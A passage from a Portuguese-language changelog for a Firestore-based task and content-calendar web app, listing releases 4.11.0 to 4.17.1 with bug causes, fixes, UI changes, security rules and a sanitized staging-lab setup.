- Owner técnico: **Tiago Prado**
- Commit único `be06110 chore: create sanitized lab baseline`
- 266 arquivos (cópia higienizada do gestor)
- Propósito: validar migração BTG Pactual + evolução do LP Builder em blocos

### Diferenças vs PROD
- 8 workflows movidos pra `.github/workflows.disabled/` (nenhum ativo)
- `.firebaserc` placeholder `STAGING_PROJECT` (Firebase staging ainda não criado)
- Tokens R2 inline removidos do client
- Pages desabilitado (sem URL pública)

### Pendências do LAB
- Criar projeto Firebase dedicado
- Conta R2/Cloudflare staging
- Cadência de sync LAB ↔ PROD

### Arquivos adicionados/atualizados
- **NOVO** `STAGING-LAB.md` (raiz) — diff completo, guardrails, riscos+mitigações, comandos
- `RULES-AND-AUTOMATIONS.md` § 12 — topologia ambientes + referência cruzada
- `js/version.js`, `index.html`, `CHANGELOG.md`


## [4.17.1+20260507-cc-sync-fix-taskid-defensive] — 2026-05-07

Release **PATCH** — bugfix do sync da v4.17.0.

### Bug
A sync `task.dueDate → slot.scheduledDate` da v4.17.0 falhava silenciosamente. `subscribeToTasksByIds` quebrava com:
```
Invalid query. When querying with documentId(), you must provide a valid string or a DocumentReference, but it was: a custom Object
```

### Causa
Algum slot tinha `taskId` salvo como **objeto** (referência?) em vez de string. Um valor errado quebrava a query inteira (Firestore `where(documentId(), 'in', [...])` valida strict). Listener nunca chamava callback → `_linkedTasks` ficava vazio → sync nunca disparava.

### Fix defensivo (2 camadas)
- `subscribeToTasksByIds` filtra: `t => typeof t === 'string' && t.trim()`
- `_bindTasksListener` aplica mesmo filtro antes de passar IDs

Slots com `taskId` mal-salvado ficam órfãos do sync (badge não reflete status), mas o sistema todo não trava mais.

### Validação E2E
- Cria task com `dueDate: 2026-05-10` + slot vinculado com mesma data
- `updateTask(taskId, { dueDate: 2026-05-25 })`
- Aguarda 6s pra listener disparar
- ✅ Slot final: `scheduledDate: 2026-05-25` (sync aplicou)

### Arquivos alterados
- `js/services/contentCalendar.js` — filtro defensivo no service
- `js/pages/contentCalendar.js` — filtro defensivo na page
- `js/version.js`, `index.html`, `CHANGELOG.md`


## [4.17.0+20260507-cc-sync-task-date-to-slot] — 2026-05-07

Release **MINOR** — Sync de data unidirecional: tarefa → slot.

### Pedido do user
> "relação entre slot e tarefa, no calendário de conteúdo: se mudar a data na tarefa, precisa refletir no slot"

### Mudança de comportamento

Na v4.16.0 implementei live lookup com decisão deliberada de **não replicar campos** do slot (slot e task podiam ter datas diferentes). Após feedback do user, agora **sincroniza automaticamente**: quando a `task.dueDate` muda, o `slot.scheduledDate` é atualizado pra acompanhar.

### Implementação

`_syncTaskDatesToSlots(taskMap)` no callback do `subscribeToTasksByIds`:

1. Pra cada `[taskId, task]` no Map de tasks vinculadas:
   - Skip se `task.dueDate` é null
   - Encontra o slot com `slot.taskId === taskId`
   - Normaliza `task.dueDate` pra `YYYY-MM-DD` no fuso local (via `parseLocalDate` + `formatDate`)
   - Skip se já são iguais
2. Aplica `updateSlot(id, { scheduledDate: newDate })` em paralelo
3. Atualiza local cache + re-renderiza body

### Por que **unidirecional** (task → slot)?

Evita loop:
- **Slot tem listener próprio** (`subscribeToSlots`) que atualiza UI mas NÃO escreve na task
- **Task tem este listener** que escreve no slot quando `dueDate` diverge
- **Drag-drop no slot** escreve apenas `slot.scheduledDate` (não toca task)

Se fosse bidirecional, drag-drop no slot mudaria task.dueDate, que dispararia este listener, que escreveria de novo no slot → loop.

### Tolerâncias

- Skip se `task.dueDate` é null/undefined
- Skip se as datas (normalizadas) já são iguais (idempotente)
- Falha de `updateSlot` é silenciosa (permissão, network, etc) — só log no console.debug. Próxima execução do listener tenta de novo.

### UI: badge "↺ sincronizado"

No modal do slot, na seção "Tarefa vinculada", o campo "Prazo" agora mostra um pequeno indicador `↺ sincronizado` com tooltip "A data deste slot acompanha automaticamente o prazo da tarefa."

### Arquivos alterados
- `js/pages/contentCalendar.js` — `_syncTaskDatesToSlots()` novo (~+50 linhas) + label "↺ sincronizado" no modal
- `js/version.js` — bump 4.16.2 → 4.17.0
- `index.html`, `CHANGELOG.md`


## [4.16.2+20260507-cc-ux-add-project-btn] — 2026-05-07

Release **PATCH** — UX: ajuste nos botões do calendário de conteúdo.

### Pedido do user
> "tirar o botão '+ novo projeto' da página e deixar o botão '+ adicionar projeto' no padrão de botões (sem tracejado, cor 'cheia', dentro do botão em si)"

### Mudanças

#### "+ Novo projeto" REMOVIDO
- Botão antigo redirecionava pra `/projects`
- User considerou redundante (já existe em `/projects` direto + ainda há "Ver todos os projetos" no empty state)
- Handler `cc-new-project` em `bindHeaderEvents` também removido

#### "+ Adicionar projeto" — RESTILIZADO

| Antes | Depois |
|---|---|
| Border `dashed` dourada | Sem border |
| Background `transparent` | Background `var(--brand-gold)` (cor cheia) |
| Texto cor dourada | Texto branco |
| Font-weight 500 | Font-weight 600 |
| Padding 4×10px | Padding 6×14px |
| — | Hover: opacity 0.85 |

Mais alinhado com o padrão de botões primários do sistema.

### Arquivos alterados
- `js/pages/contentCalendar.js` — remoção do botão + restilização + handler removed
- `js/version.js` — bump 4.16.1 → 4.16.2
- `index.html`, `CHANGELOG.md`


## [4.16.1+20260507-cc-fix-popover-tdz-shadow] — 2026-05-07

Release **PATCH** — bug crítico do popover "+ Adicionar projeto" que não abria.

### Bug
Click no "+ Adicionar projeto" não fazia nada. Sem console error visível ao usuário porque o erro era `ReferenceError` dentro de bloco try silencioso (não havia try). O popover era criado mas a linha `pop.innerHTML = ...` jogava `ReferenceError: Cannot access 'esc' before initialization`.

### Causa raiz: shadowing + TDZ

A função `_openAddProjectPopover` declara no fim:
```js
const esc = (ev) => { if (ev.key === 'Escape') close(); };
```

Esse `esc` (handler de Escape) **shadows** o `esc` global do módulo (linha 21 — escape HTML). Por causa do TDZ (temporal dead zone) de `const`, **qualquer uso de `esc()` na função** — mesmo nas linhas anteriores ao `const esc = ...` — falha com ReferenceError.

A função usava `esc()` no template do `pop.innerHTML` (escape de `p.id`, `p.name`, `p.icon`) que disparava o erro.

### Fix

Renomeado o handler de `esc` → `escHandler`. Adicionado comentário explicando o pegadinha pra futuros devs não repetirem.

```js
// ATENÇÃO: NÃO renomear `escHandler` pra `esc` — `esc` é a função global
// de escape HTML do módulo (linha 21). Shadow + TDZ causam ReferenceError
// em qualquer uso de esc() acima nesta função (bug 4.16.0 fix).
```

### Detecção
Investigação via console.log step-by-step + `try/catch` revelando o ReferenceError. Tempo de debug: ~30 min.

### Arquivos alterados
- `js/pages/contentCalendar.js` — rename `esc` → `escHandler` + comentário
- `js/version.js` — bump 4.16.0 → 4.16.1
- `index.html`, `CHANGELOG.md`


## [4.16.0+20260507-cc-multi-project-task-snapshot] — 2026-05-07

Release **MINOR** — Calendário de Conteúdo: 3 melhorias pedidas pelo user.

### Pedidos do user
> 1. "tem o slot/ slot transformado em tarefa e precisamos, também, de visualização do slot que virou tarefa e essa tarefa foi concluída"
> 2. "quando slot convertido em tarefa, e tarefa é atualizada/editada, isso precisa ser refletido no slot"
> 3. "opção de ver mais de um calendário ao mesmo tempo (usuário seleciona quantos quiser)"

### Decisões alinhadas com o user
- **D**: badge "✓ Concluída" verde + ícone, sem riscar título
- **A**: live lookup (não replica campos do slot — preserva semântica)
- **B**: chips coloridos com ✕ pra remover, "+ Adicionar projeto" via popover

### Implementação

#### Item 1+2 — Visualização tarefa + reflexão live

**Service `subscribeToTasksByIds(taskIds, callback)`** (NOVO):
- Coleta `taskIds` únicos dos slots com `slot.taskId`
- Chunks de 30 (limite Firestore para `where(documentId(), 'in', [...])`)
- Mantém `Map<taskId, task>` consolidado, atualiza em real-time
- Retorna unsubscribe que cancela todos os listeners

**Page**: `_bindTasksListener()` re-vincula sempre que slots mudam (com signature dedup pra evitar re-subscribe se IDs não mudaram).

**Slot card** com 3 estados visuais distintos:
- 📝 Slot só (sem taskId)
- 🔄 Slot + tarefa **em andamento** — badge amarelo "Tarefa"
- ✓ Slot + tarefa **concluída** — badge verde "✓ Concluída"
- ✕ Slot + tarefa **cancelada** — badge cinza riscado
- Mode compact: só ícone (✓ verde / ● amarelo) pra economizar espaço

**Modal "Tarefa vinculada"**:
- Substitui o banner antigo "Convertido em tarefa"
- Snapshot live: título, status, prazo, concluída em, responsáveis (avatars com iniciais)
- Link "Abrir tarefa →" abre o `taskModal` direto com cached data (zero fetch extra)

#### Item 3 — Multi-projeto

**Service**: `fetchSlots`/`subscribeToSlots` aceitam `projectIds: string[]` (mantém `projectId` single pra retrocompat).

**Page**:
- Estado: `activeProjectIds[]` (substitui `activeProjectId` single, mas mantém espelho)
- URL: `?projects=id1,id2,id3` (CSV) ou `?project=id` (single, legado)
- **Chips bar** abaixo do header:
  - Cada chip mostra ícone + nome do projeto + ✕ pra remover
  - Borda colorida com cor do projeto
  - Botão "+ Adicionar projeto" abre popover com lista filtrável
- **Slot card border-left** colorido com cor do projeto (quando >1 projeto ativo)
- **Slot card mostra projeto** abaixo do status (quando >1)

### UX

```
┌─ Calendário · 2 projetos ──────────────────────────────┐
│ Visualizando múltiplos projetos. Cores = cor do projeto│
├────────────────────────────────────────────────────────┤
│ Projetos: [🎨 Black Friday ✕] [🏖 Verão 2026 ✕]       │
│ + Adicionar projeto                                     │
└────────────────────────────────────────────────────────┘
```

### Arquivos alterados
- `js/services/contentCalendar.js` — `subscribeToTasksByIds` novo, `projectIds` em fetch+subscribe
- `js/pages/contentCalendar.js` — estado multi, chips UI, slot card dinâmico, modal snapshot live, popover "+ projeto"
- `js/version.js` — bump 4.15.1 → 4.16.0
- `index.html`, `CHANGELOG.md`


## [4.15.1+20260507-fix-orphan-permission-projects-manage] — 2026-05-07

Release **PATCH** — auditoria de roles + correção de permission órfã + atualização do RULES-AND-AUTOMATIONS.md.

### Auditoria de roles (resultado)

Cruzei todas as `store.can('xxx')` calls no código vs `PERMISSION_CATALOG` em `rbac.js`:

| Métrica | Valor |
|---|---|
| Permissions no catálogo | 63 |
| Usadas via `store.can()` direto | 36 |
| Usadas via helpers | 8 |
| Catalogadas mas órfãs (0 hits) | 3 (`ai_skills_manage`, `requests_manage`, `audit_logs_view`) |
| **Usadas no código mas fora do catálogo** | **1** (`projects_manage`) ← BUG SILENCIOSO |

### Bug corrigido: `projects_manage`

Em `js/pages/tasks.js:484` o check usava `store.can('projects_manage')` mas essa permission **não existia** no `PERMISSION_CATALOG`. Resultado: sempre retornava `false` (exceto pra master via bypass `isMaster()`).

**Fix**: trocado por `store.can('project_edit')` que existe e é semanticamente o equivalente correto (quem edita projetos pode atribuir/remover tarefas órfãs).

### Documentação atualizada

`RULES-AND-AUTOMATIONS.md` ganhou nova seção **§ 11. Features 4.10–4.15** documentando:
- Presence ativo vs ausente (4.10.0)
- Calendário por projeto (4.11.0)
- Tempo de uso do sistema (4.12.0)
- Bulk update de tarefas (4.13.0)
- Edição inline em células (4.14.0–4.14.1)
- Calendário: drag-drop + real-time + bug fixes (4.15.0)
- Auditoria de permissions + roles personalizadas (4.15.1)

### Roles personalizadas (resposta ao user)

Sistema **suporta** roles custom sem breakage. Master cria em `/roles` → escolhe checkboxes do catálogo de 63 perms. Recomendado usar apenas keys já existentes (não inventar nomes que não casem com `store.can('key')` no código).

### Arquivos alterados
- `js/pages/tasks.js` — fix `projects_manage` → `project_edit`
- `RULES-AND-AUTOMATIONS.md` — +130 linhas (§ 11 novo)
- `js/version.js` — bump 4.15.0 → 4.15.1
- `index.html`, `CHANGELOG.md`


## [4.15.0+20260507-cc-bugs-tz-perm-dragdrop] — 2026-05-07

Release **MINOR** — Auditoria criteriosa do Calendário de Conteúdo. Corrige 3 bugs reportados + 3 colaterais + adiciona real-time.

### Bugs reportados pelo user
> "tarefas colocadas no calendário não podem ser alteradas (sistema não registra alteração)"
> "calendário está alterando data (usuário seta dia 8 e sistema registra dia 7)"
> "não há opção de drag and drop"

### Bug 1 — Timezone (dia 8 → dia 7) [CRÍTICO]

**Causa raiz**: `new Date('2026-05-08')` em JS é interpretado como UTC midnight. No fuso UTC-3 (Brasil), vira `2026-05-07T21:00:00`. Display perdia 1 dia.

**Fix**: helper `parseLocalDate(value)` que retorna `Date` no fuso local (constrói com meio-dia pra robustez contra DST). Substituídas TODAS as 8 ocorrências de `new Date(s.scheduledDate)` em `pages/contentCalendar.js`:
- `slotsForDate()` — filter da view mensal
- `renderListView()` — filter + sort
- `renderSlotCard()` — display compact e detalhado
- `openSlotModal()` — pré-população do input date
- `openSuggestWeekModal()` — sugestões IA
- Helpers de export PDF/XLS

### Bug 2 — Edição silenciosa [ALTO]

**Causa raiz dupla**:
1. `updateSlot()` no service só permitia master, `content_calendar_manage` ou owner. **Membro do projeto** não conseguia editar slots criados por colega.
2. Toast catch usava mensagem genérica "Erro ao salvar slot" — escondia "Permissão negada".

**Fix**:
- **Permissão alinhada ao modelo de projetos (v4.11+)**: agora qualquer member do projeto do slot pode editar. Lookup feito no `updateSlot` lendo `projects/{slot.projectId}.members`.
- **Toast usa `e.message` real** em handleSave + handleDelete

### Bug 3 — Drag and drop [FEATURE]

**Implementado**:
- Cards de slot com `draggable="true"` (apenas modo non-compact por enquanto, mas a classe é a mesma)
- `cc-day-cell` com handlers `dragover` / `dragleave` / `drop`
- Drop dispara `updateSlot(id, { scheduledDate: novaData })`
- Visual feedback: card arrastado fica `opacity:.4` + rotação leve; cell destino destaca com bg dourado + box-shadow

CSS injetado idempotentemente via `ensureCalendarStyles()` (não tem css/contentCalendar.css). Classes:
- `.cc-slot-card.cc-dragging`
- `.cc-day-cell.cc-drag-over`

### Bonus — Fase 2: Real-time

Adicionado `subscribeToSlots(callback, filters)` no service. Page agora usa listener `onSnapshot` em vez de fetch único:
- Mudanças de outro user aparecem automaticamente
- Cleanup via `destroyContentCalendar()` exportada para o router
- `setActiveProject()` reinicia listener com novo scope

### Arquivos alterados
- `js/services/contentCalendar.js` — `subscribeToSlots`, `updateSlot` com lookup de projeto, `onSnapshot` import
- `js/pages/contentCalendar.js` — `parseLocalDate` helper, ~10 substituições, drag handlers, listener wiring, CSS injection
- `js/version.js` — bump 4.14.3 → 4.15.0
- `index.html`, `CHANGELOG.md`


## [4.14.3+20260507-kanban-add-btn-top] — 2026-05-07

Release **PATCH** — UX: botão "+ Adicionar tarefa" no Steps movido pro topo da coluna.

### Pedido do user
> "trocar a localização do botão '+ Adicionar tarefa', que hoje está na parte inferior da coluna, para abaixo do título da coluna"

### Mudança

Antes: botão no rodapé da coluna (precisava scrollar coluna inteira pra encontrar).
Depois: botão logo abaixo do header da coluna (sempre visível).

### Implementação

#### `js/pages/kanban.js`
- `renderColumn()` (kanban view) — botão movido pra antes do `kanban-col-body`
- `renderPipelineColumn()` (pipeline/esteira view) — mesma mudança
- Classe adicionada: `.kanban-add-btn-top` pra variante visual
- Mantido `data-add-status` / `data-add-step` / `data-type-id` (sem mudança no handler de click)

#### `css/tasks.css`
- `.kanban-add-btn.kanban-add-btn-top` — margens e padding mais compactos
- `text-align: center` (ao invés de `left`) pro centro
- Hover: bordas sólidas (mais clean)

### Arquivos alterados
- `js/pages/kanban.js` — 2 funções de render alteradas
- `css/tasks.css` — variante `.kanban-add-btn-top`
- `js/version.js`, `index.html`, `CHANGELOG.md`


## [4.14.2+20260507-fix-bulkbar-stack-overflow] — 2026-05-07

Release **PATCH** — corrige bug crítico no bulkActionBar (existia desde v4.13.0).

### Bug
RangeError: Maximum call stack size exceeded — `show()` → `update()` → `show()` em loop infinito.

```js
// ANTES (bugado)
show()   { ...; this.update(); }      // chama update
update() { ...; if (n) this.show(); } // chama show de novo → recursão
```

Sintoma: ao tentar abrir popover de inline edit (incluindo o novo Tipo/Etapa da v4.14.1), o navegador travava silenciosamente. Os testes passavam quando a bulk bar não estava montada (primeira interação), mas qualquer interação subsequente disparava stack overflow.

### Fix
Helper `_setVisible(visible, count)` único que faz o trabalho. `show()`/`hide()`/`update()` apenas chamam ele com flags diferentes, sem recursão.

### Arquivos alterados
- `js/components/bulkActionBar.js` — refator do API público (~+10 linhas, -10)
- `js/version.js` — bump 4.14.1 → 4.14.2
- `index.html`, `CHANGELOG.md`


## [4.14.1+20260507-inline-edit-typestep] — 2026-05-07

Release **PATCH** — Adiciona Tipo/Etapa à edição inline na lista.

### Pedido do user
> "faltou fazer em tipo/etapa"

### Implementação

#### Novo: `openTypeStepPopover(anchor, { onPick, task, allTaskTypes })`

Popover **dual** com 2 seções:
1. **TIPO** — lista todos os tipos disponíveis: built-in (Padrão, Newsletter) + custom types do Firestore
2. **ETAPA** — depende do tipo atual:
   - Newsletter → 9 NEWSLETTER_STATUSES (Pauta, Conteúdo técnico, Redação, Design, Revisão, Tarifa e dispo, Agendado, Disparado, Análise de Dados)
   - Custom types → seu array `steps[]`
   - Padrão (sem tipo) → mensagem "este tipo não tem etapas"

### Lógica de patch

Click numa **Tipo**:
- Se mudou de tipo → patch limpa step antigo (`newsletterStatus: ''` ou `customFields.currentStep: ''`) pra forçar re-escolha consistente
- `task.type` recebe valor built-in ou null
- `task.typeId` recebe id do custom type ou null

Click numa **Etapa**:
- Se tipo é Newsletter → patch `{ newsletterStatus: v }`
- Se tipo é custom → patch `{ customFields: { ..., currentStep: v } }`

### `tasks.js`

- Cell "Tipo/Etapa" virou `class="task-cell-edit" data-edit-field="typeStep"`
- Switch case adicionado em `_openInlineEditPopover` chamando `openTypeStepPopover` com `pageTaskTypes`

### Arquivos alterados
- `js/components/taskPopovers.js` — `openTypeStepPopover` (~+130 linhas)
- `js/pages/tasks.js` — cell clickable + case 'typeStep'
- `js/version.js` — bump 4.14.0 → 4.14.1
- `index.html`, `CHANGELOG.md`


## [4.14.0+20260507-inline-edit-cells] — 2026-05-07

Release **MINOR** — Edição inline em células de tarefa, sem abrir o modal.

### Pedido do user
> "seria interessante mudar o status, area, prazo e responsáveis da tarefa sem ter que abrir ela"

### UX entregue
- **Hover em célula editável** → background dourado + cursor pointer (sinal claro)
- **Click numa célula** → popover ancorado (mesmo estilo dos do bulk)
- **Click numa opção** → updateTask single + toast "Atualizado · X"
- **Não abre o modal** — só o título da tarefa abre modal (comportamento original)

### Campos com inline edit

| View | Campos |
|---|---|
| Lista (Tarefas) | Status, Área, Prazo, Responsáveis |
| Kanban (Steps) | Prazo, Responsáveis (status segue via drag-and-drop) |

> **Por que kanban não tem status inline?** Drag entre colunas já é o método primário pra mudar status — duplicar via popover gera ambiguidade. Bulk select continua disponível pra mudanças em massa.

### Refator: `taskPopovers.js` (NOVO)

Popovers extraídos do `bulkActionBar.js` e centralizados num módulo compartilhado:
- `openDueDatePopover(anchor, { onPick, currentValue })`
- `openStatusPopover(anchor, { onPick, currentValue })`
- `openAreaPopover(anchor, { onPick, currentValue })` — **NOVO** (REQUESTING_AREAS)
- `openAssigneesPopover(anchor, { onPick, currentValue, allUsers, multi })`
- `openPriorityPopover` / `openProjectPopover` / `openNucleoPopover` (também disponíveis)
- `closeTaskPopover()` — utilitário

Cada popover destaca o valor atual com `✓` em cor dourada.

### `bulkActionBar.js` agora delega

Removidas ~280 linhas de implementação duplicada. O bulk bar agora é DRY:
```js
function popDueDate(btn)   { openDueDatePopover(btn,   { onPick: applyPatch }); }
function popStatus(btn)    { openStatusPopover(btn,    { onPick: applyPatch }); }
// ... etc
```

Bonus: bulk bar ganhou botão **▸ Área** (popover já existia, só faltava expor).

### `tasks.js` (Lista)

- 4 cells com `class="task-cell-edit" data-edit-field="..." data-edit-id="..."`
- Click delegate captura `[data-edit-field]` e chama `_openInlineEditPopover(cell, field, task)`
- Helper aplica `updateTask` single + atualiza local cache + re-renderiza sem refetch

### `kanban.js` (Steps)

- 2 cells (due + assignees) com `class="kb-cell-edit"`
- Mesmo flow: handler intercepta antes do `openTaskModal`
- `e.stopPropagation()` evita conflito com drag-and-drop

### CSS

```css
.task-cell-edit:hover, .kb-cell-edit:hover {
  background: rgba(212, 168, 67, 0.10);
  box-shadow: inset 0 0 0 1px rgba(212, 168, 67, 0.35);
}
```

### Arquivos alterados
- `js/components/taskPopovers.js` — NOVO (~370 linhas)
- `js/components/bulkActionBar.js` — refatorado (-280 linhas)
- `js/pages/tasks.js` — cells clickable + handler (~+50 linhas)
- `js/pages/kanban.js` — cells clickable + handler (~+40 linhas)
- `css/tasks.css` — `.task-cell-edit`, `.kb-cell-edit` hover styles
- `js/version.js` — bump 4.13.0 → 4.14.0
- `index.html`, `CHANGELOG.md`


## [4.13.0+20260507-bulk-task-update-monday-style] — 2026-05-07

Release **MINOR** — Atualização em massa de tarefas estilo Monday.com, na lista E no Steps (Kanban).

### Pedido do user
> "atualização em massa, pra alterar prazo, prioridade, status, responsável... de preferência, direto na lista/steps... usuario relata function que existe no app monday"

### Decisões alinhadas
- **Escopo B**: Lista + Steps (Kanban) — mesma versão
- **Sem Undo** (B) — confirmação dupla apenas no delete

### UX implementada
1. Cada linha de tarefa (lista) e cada card (Steps) ganha um **checkbox** sempre visível
2. Ao selecionar ≥1 tarefa, **action bar flutuante** desliza pelo rodapé
3. Action bar mostra **6 ações** + delete:
   - 📅 Prazo · 🔥 Prioridade · 🚦 Status · 👤 Responsável · ◈ Projeto · ◉ Núcleo · 🗑 Excluir
4. Click numa ação abre **popover** com opções (popovers contextualizados por tipo)
5. Click numa opção dispara **batch update** via Firestore writeBatch
6. Toast confirma "N tarefas atualizadas — alteração: X"

### Implementação

#### `js/components/bulkActionBar.js` (NOVO — componente compartilhado)
- `mountBulkActionBar({ getSelectedIds, getSelectedTasks, onClear, onAfterUpdate, allProjects, allUsers })`
- Barra flutuante com `transform` animation (slide-in/out do rodapé)
- Popovers por ação: prazo (date input + remover), prioridade (4 cores), status (5 estados), responsável (multi-select com search), projeto (search), núcleo (12 opções), delete (confirmação dupla)
- Reutilizado em ambas as páginas — DRY total

#### `js/services/tasks.js`
- `bulkUpdateTasks(items, onProgress)` — JÁ EXISTIA, signature `[{id, data}]`. Reuso direto.
- `bulkDeleteTasks(ids, onProgress)` — NOVO. Batches de 400, audit log, invalidate cache

#### `js/pages/tasks.js` (Lista)
- State: `_selectedTaskIds = new Set()` + `_bulkBar`
- `renderTaskRow`: nova primeira coluna com checkbox `.bulk-checkbox`
- `renderListHeader`: master-checkbox que seleciona/desmarca tudo
- Click delegation pra checkbox (toggle individual + master)
- `_refreshBulkUi()` — re-pinta linhas selecionadas (border dourada) + atualiza master + show/hide bar

#### `js/pages/kanban.js` (Steps)
- State idêntico: `_selectedTaskIds` + `_bulkBar`
- `renderKanbanCard`: checkbox no canto superior esquerdo (par com check de done à direita)
- Click handler pro checkbox (com `e.stopPropagation` pra não abrir modal)
- `_refreshKanbanBulkUi()` — pinta cards com `box-shadow: 0 0 0 2px gold` + bar update

#### CSS `css/tasks.css`
- `.task-row` grid-template-columns: nova coluna 28px no início
- `.task-row.bulk-selected` — bg dourado claro + border dourada
- `.task-list-header` grid alinhado
- Mobile breakpoints atualizados (1024px, 640px)

### Performance
- Firestore writeBatch (max 400 ops/batch) — atualiza centenas de tarefas em 1 RTT
- Para >400, função chunca em múltiplos batches sequenciais
- `invalidateTasksCache()` + `onAfterUpdate` re-fetch pra UI atualizar

### Permissões
- `bulkUpdateTasks` confia que página filtrou tarefas que user pode ver
- Firestore rules vão rejeitar tarefas que o user não pode editar (batch atômico — se 1 falha, todo o batch rollback)
- Em produção, recomendado filtrar IDs editáveis client-side antes do submit

### Arquivos alterados
- `js/components/bulkActionBar.js` — NOVO (~340 linhas)
- `js/services/tasks.js` — `bulkDeleteTasks` adicionada
- `js/pages/tasks.js` — checkbox + bulk handler + `_refreshBulkUi` (~+80 linhas)
- `js/pages/kanban.js` — checkbox + bulk handler + `_refreshKanbanBulkUi` (~+60 linhas)
- `css/tasks.css` — grid-template-columns + estilos bulk-selected (~+15 linhas)
- `js/version.js` — bump 4.12.0 → 4.13.0
- `index.html`, `CHANGELOG.md`


## [4.12.0+20260507-presence-daily-usage-widget] — 2026-05-07

Release **MINOR** — Tempo de uso do sistema agora é trackado e exibido no dashboard de produtividade.

### Pedido do user
> "usuarios online/ausente (presence): colocar no dash de produtividade o tempo de uso no sistema (com os mesmos filtros do dash)"

### Implementação

#### Schema novo: `presence_daily`
```
presence_daily/{uid}_{YYYY-MM-DD} {
  uid, userName, email, sector, nucleos[],
  date: 'YYYY-MM-DD',
  activeMs, idleMs, totalMs,
  lastSeen, updatedAt,
}
```

#### `presence.js` — acumulador atomic
Cada heartbeat (a cada 2-5min) calcula o delta desde o último write. Se o gap ≤ 10min (continuidade de sessão), incrementa `totalMs` e `activeMs`/`idleMs` (conforme state anterior) via `FieldValue.increment(delta)`. Gaps > 10min (user offline, abas todas fechadas) NÃO contam — preserva semantics de "tempo realmente usando".

#### `services/presenceUsage.js` (novo)
- `fetchUsageByPeriod({ from, to, userIds, sectors, nucleos })` — busca docs do período + agrega por usuário, retorna breakdown ordenado por totalMs desc
- `summarizeUsage(breakdown)` — totais agregados (users, totalH, activeH, idleH, avgMsPerUser, activePct)
- `formatDuration(ms)` — string amigável "12h 34min" / "45min"

#### Widget `presence-usage-widget` no dashboard de produtividade
Posicionado entre os blocos R3 e Insights:
- **6 KPI cards**: Usuários ativos · Tempo total · Tempo ativo · Tempo ausente · Média/usuário · % Ativo
- **Leaderboard top 10**: avatar + nome + setor + dias ativos + barra de progresso + duração
- Empty state com explicação clara quando não há dados (período antes da feature)

Herda **automaticamente** os filtros do dashboard:
- Período (7d / 30d / 90d / 12m / custom)
- Usuário, Núcleo, Setor

#### Firestore rules
```
match /presence_daily/{docId} {
  allow read:   if isAuth();
  allow write:  if isAuth() && request.resource.data.uid == request.auth.uid;
  allow delete: if isAdmin();
}
```

### Cost analysis
Para 200 users com 30% idle:
- Heartbeats: ~720/dia ativo + 288/dia idle = ~510 writes/user/dia
- Cada heartbeat agora escreve em 2 docs (presence + presence_daily)
- Total: ~204k writes/dia (-15% vs estimativa anterior por skip-when-state-unchanged)
- Storage: 200 docs/dia em presence_daily = 73k docs/ano (manageable)

### Nota importante
Os dados de uso começam a acumular **a partir desta versão**. Períodos passados aparecerão vazios. Em 7-30 dias o dashboard estará populado e útil.

### Arquivos alterados
- `js/services/presence.js` — daily accumulator no writeHeartbeat
- `js/services/presenceUsage.js` — NOVO arquivo (fetch + summarize + format)
- `js/pages/dashboards.js` — widget presence-usage-widget + chamada no flow principal
- `firestore.rules` — collection presence_daily
- `js/version.js` — bump 4.11.1 → 4.12.0
- `index.html` — cache-bust v=


## [4.11.1+20260507-cc-fix-container-id-race] — 2026-05-07

Release **PATCH** — bugfixes encontrados em testes da v4.11.0.

### Bug 1: Container ID errado (Empty state mesmo com projeto selecionado)
`renderContentCalendar()` e `setActiveProject()` faziam fallback pra `document.getElementById('main')`, mas o container correto é `#page-content`. Resultado: a UI re-renderizava num container fantasma; o `#page-content` continuava com o HTML do empty state inicial.

Fix: `document.getElementById('page-content') || document.getElementById('main')` em ambos os pontos.

### Bug 2: Race condition na migration cria projeto "Geral · Conteúdo" duplicado
Duas chamadas concorrentes de `ensureGeneralProjectAndMigrateOrphans()` (provavelmente do hashchange disparando renderContentCalendar 2x) competiam: ambas viam `projSnap.empty=true` e criavam doc Firestore. Resultado: 2 projetos "Geral · Conteúdo" no banco.

Fix em 2 camadas:
1. Set `sessionStorage[migration-flag]='in-progress'` IMEDIATO (síncrono) antes de qualquer await — bloqueia segunda call
2. Quando query encontra múltiplos projetos com mesmo nome, escolhe o **mais antigo** (createdAt menor) como canônico

### Limpeza manual
A duplicata existente em produção foi arquivada manualmente via JS no browser (renomeada com sufixo "(duplicata · arquivado)").

### Arquivos alterados
- `js/services/contentCalendar.js` — defesa contra race condition
- `js/pages/contentCalendar.js` — fix container ID em 2 pontos
- `js/version.js` — bump 4.11.0 → 4.11.1
- `index.html` — cache-bust v= alinhado


## [4.11.0+20260507-content-calendar-by-project] — 2026-05-07

Release **MINOR** — Calendário de Conteúdo agora é organizado por **projeto**, não mais global.

### Pedido do user
> "calendário de conteúdo: separar por projetos, e não ter um global. usuario acessa calendário de interesse via filtro."

### Decisões de design (alinhadas com o user)
1. **Projeto = collection `projects` existente** — reaproveita permissões/squads
2. **Projeto coexiste com `account`** — projeto = "qual campanha/iniciativa?" · conta = "qual handle posta?"
3. **Migração A**: cria projeto "Geral · Conteúdo" e atribui slots órfãos automaticamente
4. **"+ Novo projeto"** redireciona pra `/projects` (não abre modal inline)

### Implementação

#### Schema
- Slot ganha campo `projectId: string` (referência a `projects/{id}`)
- Migration idempotente `ensureGeneralProjectAndMigrateOrphans()`:
  - Procura ou cria projeto "Geral · Conteúdo" (icon 📋, status `always_on`)
  - Atribui slots sem `projectId` ao projeto Geral
  - Idempotência via `sessionStorage[cc-orphan-migration-v1]`

#### Service `contentCalendar.js`
- `fetchSlots({ projectId })` — novo filtro
- Nova função `ensureGeneralProjectAndMigrateOrphans()` exportada

#### Page `contentCalendar.js`
- **State**: `activeProjectId`, `availableProjects[]`
- **URL**: `#content-calendar?project=ABC` (bookmarkable, sincronizado via `history.replaceState` pra não disparar re-route)
- **Header**: seletor de projeto **prominente** (border dourada, primary scope) + botão "+ Novo projeto"
- **Sem projeto selecionado**: empty state com ícone 📂 + CTA "↗ Ver todos os projetos" → `/projects`
- **Com projeto**: header mostra "📱 Calendário · 📦 Nome do Projeto"; calendário mês/semana/lista filtrado
- Conta (`@handle`) continua como filtro secundário **dentro** do projeto

#### Modal de criar/editar slot
- **Banner do projeto** no topo do modal (bg colorido com ícone+nome)
- Link "Trocar de projeto →" leva pra `/projects`
- `getFormData()` injeta `projectId` automaticamente:
  - Editando: mantém `editingSlot.projectId` original
  - Criando: usa `activeProjectId`
- Validação em `handleSave()`: bloqueia criação sem projeto

#### Convert-to-task
- Tarefa gerada herda `projectId` do slot → entra automaticamente no projeto correto

### Backward-compatibility
